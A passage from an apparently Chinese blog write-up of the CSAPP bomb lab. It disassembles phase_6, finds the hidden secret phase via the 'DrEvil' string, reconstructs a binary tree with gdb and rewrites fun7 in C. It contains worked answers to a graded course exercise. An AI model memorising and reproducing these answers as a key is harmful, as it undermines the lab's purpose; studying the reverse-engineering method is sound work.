#rax=node[num[0]]<br>0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax #node[num[1]]<br>0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi <br>0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx #rcx=rbx=node[num[0]]<br>0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx #rdx= node[num[1]]<br>0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)<br>0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax<br>0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax<br>0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;<br>0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx<br>0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;<br></code></pre></td></tr></table></figure><p>这一部分将链表按栈内节点的位置顺序重新排列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)<br>0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp<br>0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax<br>0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax<br>0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)<br>0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;<br>0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx<br>0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp<br>0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;<br>0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp<br>0x00000000004011fb &lt;+263&gt;:   pop    %rbx<br>0x00000000004011fc &lt;+264&gt;:   pop    %rbp<br>0x00000000004011fd &lt;+265&gt;:   pop    %r12<br>0x00000000004011ff &lt;+267&gt;:   pop    %r13<br>0x0000000000401201 &lt;+269&gt;:   pop    %r14<br>0x0000000000401203 &lt;+271&gt;:   ret<br></code></pre></td></tr></table></figure><ul><li><code>rbx</code>指向<code>node[num[0]]</code>，<code>eax</code>指向<code>node[num[1]]</code>，如果<code>rbx&lt;eax</code>，爆炸，即<code>node[i]</code>对的值应该在栈中递减</li><li>根据node的值排序：<code>node[3]&gt;node[4]&gt;node[5]&gt;node[6]&gt;node[1]&gt;node[2]</code>，即对应<code>num[0]=3,num[1]=4,num[2]=5,num[3]=6,num[4]=1,num[5]=2</code></li><li>但前一部分中，需要对输入的进行变换（n&#x3D;7-num）才能得到num，所以最终答案是：<strong>4 3 2 1 6 5</strong></li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Congratulations! You&#x27;ve defused the bomb!<br></code></pre></td></tr></table></figure><p>至此bomb lab的6个phase全部完成。</p><h2 id="One-more-thing…"><a href="#One-more-thing…" class="headerlink" title="One more thing…"></a>One more thing…</h2><p>在<code>bomb.c</code>的最后有一段注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span><br><span class="hljs-comment">    * something they overlooked?  Mua ha ha ha ha! */</span><br></code></pre></td></tr></table></figure><p>查看<code>phase_defused</code>的汇编 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4015c4:48 83 ec 78          sub    $0x78,%rsp<br>4015c8:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>4015cf:00 00 <br>4015d1:48 89 44 24 68       mov    %rax,0x68(%rsp)<br>4015d6:31 c0                xor    %eax,%eax<br>4015d8:83 3d 81 21 20 00 06 cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;<br>4015df:75 5e                jne    40163f &lt;phase_defused+0x7b&gt;<br>4015e1:4c 8d 44 24 10       lea    0x10(%rsp),%r8<br>4015e6:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx<br>4015eb:48 8d 54 24 08       lea    0x8(%rsp),%rdx<br>4015f0:be 19 26 40 00       mov    $0x402619,%esi<br>4015f5:bf 70 38 60 00       mov    $0x603870,%edi<br>4015fa:e8 f1 f5 ff ff       call   400bf0 &lt;__isoc99_sscanf@plt&gt;<br>4015ff:83 f8 03             cmp    $0x3,%eax<br>401602:75 31                jne    401635 &lt;phase_defused+0x71&gt;<br>401604:be 22 26 40 00       mov    $0x402622,%esi<br>401609:48 8d 7c 24 10       lea    0x10(%rsp),%rdi<br>40160e:e8 25 fd ff ff       call   401338 &lt;strings_not_equal&gt;<br>401613:85 c0                test   %eax,%eax<br>401615:75 1e                jne    401635 &lt;phase_defused+0x71&gt;<br>401617:bf f8 24 40 00       mov    $0x4024f8,%edi<br>40161c:e8 ef f4 ff ff       call   400b10 &lt;puts@plt&gt;<br>401621:bf 20 25 40 00       mov    $0x402520,%edi<br>401626:e8 e5 f4 ff ff       call   400b10 &lt;puts@plt&gt;<br>40162b:b8 00 00 00 00       mov    $0x0,%eax<br>401630:e8 0d fc ff ff       call   401242 &lt;secret_phase&gt;<br>401635:bf 58 25 40 00       mov    $0x402558,%edi<br>40163a:e8 d1 f4 ff ff       call   400b10 &lt;puts@plt&gt;<br>40163f:48 8b 44 24 68       mov    0x68(%rsp),%rax<br>401644:64 48 33 04 25 28 00 xor    %fs:0x28,%rax<br>40164b:00 00 <br>40164d:74 05                je     401654 &lt;phase_defused+0x90&gt;<br>40164f:e8 dc f4 ff ff       call   400b30 &lt;__stack_chk_fail@plt&gt;<br>401654:48 83 c4 78          add    $0x78,%rsp<br>401658:c3                   ret    <br></code></pre></td></tr></table></figure><p>发现在 <code>phase_defused</code>中会调用<code>secret_phase</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/s 0x402619<br>0x402619:       &quot;%d %d %s&quot;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) x/s 0x402622<br>0x402622:       <span class="hljs-string">&quot;DrEvil&quot;</span><br></code></pre></td></tr></table></figure><p>不难猜测应该是在某个两个数字的后面加上一个字符串<code>DrEvil</code></p><p>经尝试发现在第四个答案后添加指定字符串可进入隐藏关</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Curses, you&#x27;ve found <span class="hljs-keyword">the</span> secret phase!<br>But finding <span class="hljs-keyword">it</span> <span class="hljs-keyword">and</span> solving <span class="hljs-keyword">it</span> are quite different...<br></code></pre></td></tr></table></figure><p>这里的<code>secret_phase</code>便是<strong>暗雷</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401242 &lt;secret_phase&gt;:<br>401242:53                   push   %rbx<br>401243:e8 56 02 00 00       call   40149e &lt;read_line&gt;<br>401248:ba 0a 00 00 00       mov    $0xa,%edx<br>40124d:be 00 00 00 00       mov    $0x0,%esi<br>401252:48 89 c7             mov    %rax,%rdi<br>401255:e8 76 f9 ff ff       call   400bd0 &lt;strtol@plt&gt;<br>40125a:48 89 c3             mov    %rax,%rbx<br>40125d:8d 40 ff             lea    -0x1(%rax),%eax<br>401260:3d e8 03 00 00       cmp    $0x3e8,%eax<br>401265:76 05                jbe    40126c &lt;secret_phase+0x2a&gt;<br>401267:e8 ce 01 00 00       call   40143a &lt;explode_bomb&gt;<br>40126c:89 de                mov    %ebx,%esi<br>40126e:bf f0 30 60 00       mov    $0x6030f0,%edi<br>401273:e8 8c ff ff ff       call   401204 &lt;fun7&gt;<br>401278:83 f8 02             cmp    $0x2,%eax<br>40127b:74 05                je     401282 &lt;secret_phase+0x40&gt;<br>40127d:e8 b8 01 00 00       call   40143a &lt;explode_bomb&gt;<br>401282:bf 38 24 40 00       mov    $0x402438,%edi<br>401287:e8 84 f8 ff ff       call   400b10 &lt;puts@plt&gt;<br>40128c:e8 33 03 00 00       call   4015c4 &lt;phase_defused&gt;<br>401291:5b                   pop    %rbx<br>401292:c3                   ret  <br></code></pre></td></tr></table></figure><ul><li>在第13 14行后，调用了<code>fun7</code>函数，其中有两个参数，<code>esi</code>和<code>edi</code>,<code>esi</code>是输入，<code>edi</code>是一个内存地址</li><li>第16行，返回值与2比较，相等则成功，即目标：使<code>fun7</code>返回2.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401204 &lt;fun7&gt;:<br>  401204:48 83 ec 08          sub    $0x8,%rsp<br>  401208:48 85 ff             test   %rdi,%rdi #rdi是0则跳出<br>  40120b:74 2b                je     401238 &lt;fun7+0x34&gt;<br>  40120d:8b 17                mov    (%rdi),%edx<br>  40120f:39 f2                cmp    %esi,%edx #rdi-&gt;val&lt;=esi<br>  401211:7e 0d                jle    401220 &lt;fun7+0x1c&gt;<br>  401213:48 8b 7f 08          mov    0x8(%rdi),%rdi<br>  401217:e8 e8 ff ff ff       call   401204 &lt;fun7&gt;<br>  40121c:01 c0                add    %eax,%eax<br>  40121e:eb 1d                jmp    40123d &lt;fun7+0x39&gt;<br>  401220:b8 00 00 00 00       mov    $0x0,%eax<br>  401225:39 f2                cmp    %esi,%edx<br>  401227:74 14                je     40123d &lt;fun7+0x39&gt;<br>  401229:48 8b 7f 10          mov    0x10(%rdi),%rdi<br>  40122d:e8 d2 ff ff ff       call   401204 &lt;fun7&gt;<br>  401232:8d 44 00 01          lea    0x1(%rax,%rax,1),%eax<br>  401236:eb 05                jmp    40123d &lt;fun7+0x39&gt;<br>  401238:b8 ff ff ff ff       mov    $0xffffffff,%eax<br>  40123d:48 83 c4 08          add    $0x8,%rsp<br>  401241:c3                   ret    <br></code></pre></td></tr></table></figure><p>查看0x6030f0处的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/500x 0x06030f0<br>0x6030f0 &lt;n1&gt;:  0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603110 &lt;n21&gt;: 0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603118 &lt;n21+8&gt;:       0x90    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603120 &lt;n21+16&gt;:      0x50    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603130 &lt;n22&gt;: 0x32    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603138 &lt;n22+8&gt;:       0x70    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603140 &lt;n22+16&gt;:      0xb0    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603150 &lt;n32&gt;: 0x16    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603158 &lt;n32+8&gt;:       0x70    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603160 &lt;n32+16&gt;:      0x30    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603170 &lt;n33&gt;: 0x2d    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603178 &lt;n33+8&gt;:       0xd0    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603180 &lt;n33+16&gt;:      0x90    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603190 &lt;n31&gt;: 0x06    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603198 &lt;n31+8&gt;:       0xf0    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031a0 &lt;n31+16&gt;:      0x50    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031b0 &lt;n34&gt;: 0x6b    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031b8 &lt;n34+8&gt;:       0x10    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031c0 &lt;n34+16&gt;:      0xb0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031d0 &lt;n45&gt;: 0x28    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031d8 &lt;n45+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031e0 &lt;n45+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031f0 &lt;n41&gt;: 0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031f8 &lt;n41+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603200 &lt;n41+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603210 &lt;n47&gt;: 0x63    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603218 &lt;n47+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603220 &lt;n47+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603230 &lt;n44&gt;: 0x23    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603238 &lt;n44+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603240 &lt;n44+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603250 &lt;n42&gt;: 0x07    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603258 &lt;n42+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603260 &lt;n42+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603270 &lt;n43&gt;: 0x14    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603278 &lt;n43+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603280 &lt;n43+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603290 &lt;n46&gt;: 0x2f    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603298 &lt;n46+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032a0 &lt;n46+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032b0 &lt;n48&gt;: 0xe9    0x03    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032b8 &lt;n48+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032c0 &lt;n48+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br></code></pre></td></tr></table></figure><p>不难发现这片内存空间中存着的数据是树结构的定义，其中</p><ul><li>第一行表示其数值</li><li>第二行表示左子树的地址</li><li>第三行表示右子树的地址</li></ul><p>那么其树结构可以用下图表示 注：图中为16进制</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309062103881.png" alt="image-20230729123350571"></p><p>而fun7函数的c语言版如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fun7</span><span class="hljs-params">(Tree* rdi, <span class="hljs-type">int</span> esi)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!rdi)   <span class="hljs-comment">//第3，4行</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//19</span><br>    <span class="hljs-keyword">if</span> (rdi-&gt;val == esi)    <span class="hljs-comment">//13</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;       <span class="hljs-comment">//20</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rdi-&gt;val &lt; esi)        <span class="hljs-comment">//7</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * fun7(rdi -&gt; right, esi) + <span class="hljs-number">1</span>; <span class="hljs-comment">//15,16</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * fun7(rdi -&gt; left, esi);  <span class="hljs-comment">//8,9</span><br>&#125;<br></code></pre></td></tr></table></figure><p>反推，</p><ul><li>想要得到2，那么一定是从左子树返回1</li><li>想要得到1，那么一定从右子树返回值返回0</li><li>返回值为0，节点值就是输入的值</li></ul><p><code>2=2*fun7(8,16)</code></p><p><code>fun7(8,16)=fun7(16,16)+1=1</code></p><p>那么，隐藏关的答案便呼之欲出，<code>0x16=22</code></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Wow! You&#x27;ve defused the secret stage!<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>耗时3天，总计20h，做完只觉茅塞顿开，csapp这本书相见恨晚。</li><li>各类数据结构在机器级的实现方式令我瞋目结舌。</li><li><code>phase_5</code>的逻辑设计惊艳到了我，其通过输入字符的ascii码来定位字符，结构巧妙令人赞叹不已。</li><li><code>phase_5</code>和<code>secret_phase</code>的用时最长，其复杂的循环或递归结构逻辑复杂，需要先将其转化为c语言。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>bomb</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
